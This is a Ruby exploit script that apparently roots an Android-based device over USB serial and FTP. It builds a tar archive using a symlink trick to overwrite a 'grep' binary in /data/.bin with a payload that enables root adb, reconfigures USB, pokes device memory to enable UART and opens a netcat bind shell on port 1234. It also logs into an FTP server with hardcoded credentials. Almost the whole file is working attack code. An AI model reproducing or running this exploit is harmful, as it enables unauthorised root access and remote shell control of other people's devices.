#!/usr/bin/env ruby
require 'fileutils'
$:.unshift File.expand_path('..',__dir__)
require "RubaDubDUML.rb"

exploit = PwnSauce.new

grep = "/system/xbin/busybox touch /tmp/RedHerring.$$
/system/xbin/busybox touch /data/InYourGrill.$$
echo -n RedHerringHasFangs > /sys/class/android_usb/android0/iSerial
setprop service.adb.root 1
setprop service.adb.tcp.port -1
setprop sys.usb.config rndis,mass_storage,bulk,acm,adb
busybox devmem 0xe10093d0 8 0x40    #enable uart
sleep 1
adb_en.sh NonSecurePrivilege 
stop adbd 
start adbd
/system/xbin/busybox nc -l -p 1234 -e /system/bin/sh"

destdir = "/data/.bin"
destfile = "grep" 

system("rm -rf symlink Burning0day.txt fireworks.tar")
system("echo 'get root... Thx for all the fish P0V' > Burning0day.txt")
puts "Creating the tar file"
system("tar cpf fireworks.tar Burning0day.txt")
puts "Making the symlinks" 
system("ln -s " + destdir + " symlink")
puts "Adding the fireworks..."
system("tar --append -f fireworks.tar symlink")
system("rm -rf symlink")
system("mkdir -p symlink")

File.open("symlink/" + destfile , 'w') {|f| f.write(grep) }

system("chmod 755 " + "symlink/" + destfile ) 
puts "Boom headshot!"
system("tar --append -pf fireworks.tar symlink/" + destfile)

ftp = Net::FTP.new('192.168.42.2')
ftp.passive = true
ftp.login("RedHerring","IsDaRealest!" )
puts "Logged into the FTPD"
begin
    puts ftp.mkdir("/upgrade/.bin")
    puts "FTP mkdir completed"
rescue Net::FTPPermError
    puts "Werid FTP problem... unable to mkdir /upgrade/.bin"
end
ftp.close


exploit.pwn("/dev/tty.usbmodem1445", "fireworks.tar", "nfz")

system("rm -rf symlink Burning0day.txt fireworks.tar")

